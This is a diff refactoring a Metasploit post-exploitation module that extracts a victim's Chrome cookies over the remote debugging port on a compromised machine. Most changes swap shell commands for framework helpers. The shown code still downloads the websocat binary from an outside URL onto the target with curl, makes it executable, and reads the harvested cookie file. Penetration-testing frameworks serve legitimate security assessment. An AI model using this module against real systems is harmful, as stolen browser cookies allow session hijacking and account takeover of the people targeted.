@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -20,18 +20,18 @@ class MetasploitModule < Msf::Post
                       ",
                       'License' => MSF_LICENSE,
                       'Author' => ['mangopdf <mangodotpdf[at]gmail.com>'],
-                      'Platform' => %w[linux unix bsd osx python],
+                      'Platform' => %w[linux unix bsd osx],
                       'SessionTypes' => %w[meterpreter shell]))
 
     register_options(
       [
-        OptString.new('CHROME_BINARY_PATH', [false, 'The path to the user\'s Chrome binary (leave blank to use the default for the OS)', '']),
-        OptString.new('HEADLESS_URL', [false, 'The URL to load with the user\'s headless chrome', 'about://blank']),
+        OptString.new('CHROME_BINARY_PATH', [false, "The path to the user's Chrome binary (leave blank to use the default for the OS)", '']),
+        OptString.new('HEADLESS_URL', [false, "The URL to load with the user's headless chrome", 'about://blank']),
         OptString.new('WEBSOCAT_STORAGE_PATH', [false, 'Where to write the websocat binary temporarily while it is used', '/tmp/websocat']),
         OptString.new('COOKIE_STORAGE_PATH', [false, 'Where to write the retrieved cookies temporarily', '/tmp/websocat.log']),
         OptInt.new('MAX_RETRIES', [false, 'Max retries for websocket request to Chrome remote debugging URL', 3]),
         OptInt.new('REMOTE_DEBUGGING_PORT', [false, 'Port on target machine to use for remote debugging protocol', 9222])
-      ], self.class
+      ]
     )
   end
 
@@ -88,7 +88,7 @@ class MetasploitModule < Msf::Post
   end
 
   def download_websocat
-    if Pathname.new(@websocat_storage_path).exist?
+    if file_exist? @websocat_storage_path
       print_status "websocat binary already exists at #{@websocat_storage_path}, skipping download"
       return
     end
@@ -97,7 +97,7 @@ class MetasploitModule < Msf::Post
     print_warning "Writing websocat binary to #{@websocat_storage_path} temporarily"
     print_status "Downloading #{url} to #{@websocat_storage_path}"
     cmd_exec "curl -L #{url} > #{@websocat_storage_path}"
-    cmd_exec "chmod +x #{@websocat_storage_path}"
+    chmod @websocat_storage_path
     vprint_status 'Download complete'
 
     # Sleep here because there's sometimes a race condition ("file busy") between the binary being downloaded and executed.
@@ -105,9 +105,9 @@ class MetasploitModule < Msf::Post
   end
 
   def cleanup_websocat
-    cmd_exec "rm #{@websocat_storage_path}"
+    rm_f @websocat_storage_path
     print_status "Deleted #{@websocat_storage_path}"
-    cmd_exec "rm #{@cookie_storage_path}"
+    rm_f @cookie_storage_path
     print_status "Deleted #{@cookie_storage_path}"
   end
 
@@ -127,7 +127,7 @@ class MetasploitModule < Msf::Post
         print_error errors
       end
 
-      cookies = File.read "#{@cookie_storage_path}"
+      cookies = read_file "#{@cookie_storage_path}"
 
       # The websocket debugger URL is sometimes flaky, for whatever reason, so
       # retry a few times.
@@ -161,7 +161,7 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    print_error 'No session found, giving up' if session.nil?
+    fail_with Failure::BadConfig, 'No session found, giving up' if session.nil?
 
     @retries = datastore['MAX_RETRIES']
     @websocat_storage_path = datastore['WEBSOCAT_STORAGE_PATH']
